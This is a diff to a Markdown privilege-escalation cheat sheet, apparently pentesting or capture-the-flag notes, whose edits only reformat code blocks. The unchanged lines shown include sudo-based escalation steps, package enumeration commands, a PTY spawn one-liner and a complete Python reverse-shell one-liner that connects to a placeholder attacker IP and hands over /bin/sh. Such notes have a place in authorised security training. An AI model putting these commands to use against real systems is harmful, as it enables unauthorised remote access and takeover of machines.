@@ -72,9 +72,10 @@ kali-tweaks
 sudo -l
 ````
 - if you are able to see the ALL in the **sudo -i** 
-````bash
+
+```bash
 sudo -i
-````
+```
 - if you see the **at**  try this
 
 ```bash
@@ -94,6 +95,7 @@ cat hi.txt
 ## Kernel Vulnerabilities and Application Vulnerabilities
 
 - To list all the packages installed in the linux machine
+
 ```bash
 apt list --installed
 dpkg --list
@@ -103,6 +105,7 @@ apt list --installed | grep -v '^lib'
 ls /usr/share/applications/
 ```
 - If you don't have proper shell then try this command if it having python or bash or sh
+
 ```bash
 python -c 'import pty; pty.spawn("/bin/bash");'
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<attacker_ip>",<port>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' - **For Reverse Shell**
